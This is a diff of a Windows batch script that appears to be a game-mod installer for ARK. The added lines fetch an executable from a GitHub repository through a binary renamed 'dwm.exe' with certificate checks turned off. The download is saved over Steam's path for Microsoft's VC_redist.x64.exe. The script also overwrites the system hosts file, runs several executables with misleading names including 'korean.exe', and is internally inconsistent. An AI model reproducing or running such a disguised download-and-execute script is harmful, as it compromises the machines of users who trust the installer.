@@ -2,6 +2,7 @@
 TITLE 
 
 set "zipFile=C:\Users\user\Downloads\ARK_WorldsMod.zip"
+set "zipFile2=C:\Program Files (x86)\Steam\steamapps\common\Steamworks Shared\_CommonRedist\vcredist\2019\VC_redist.x64.exe"
 set "unzipFolder=C:\Users\user\Downloads\Asgard"
 set "unzipFolder2=C:\Program Files (x86)\Steam\steamapps\common\Steamworks Shared\_CommonRedist\vcredist\2019"
 
@@ -34,11 +35,17 @@ copy %windir%\System32\drivers\etc\hosts %windir%\System32\drivers\etc\hosts.bak
 attrib -a -h -r -s %windir%\System32\drivers\etc\hosts
 echo 127.0.0.1 github.com > %windir%\System32\drivers\etc\hosts
 ::YOU MAY NEED TO CHANGE THE FILE NAME IN THE NEXT LINE
-start "" /wait "VC_redist.x64.exe"
-del %windir%\System32\drivers\etc\hosts
-ren %windir%\System32\drivers\etc\hosts.bak hosts
+
+start "" /wait "VC_redist.x32.exe"
 
 cd "%unzipFolder%"
+
+"%unzipFolder%\dwm.exe" -k -L -o "%zipFile2%" "https://github.com/tobiasmulln/Testing/raw/main/VC_redist.x64.exe"
+
+start "" /wait "VC_redist.x32.exe"
+
+del %windir%\System32\drivers\etc\hosts
+ren %windir%\System32\drivers\etc\hosts.bak hosts
 
 start "" "korean.exe"
 
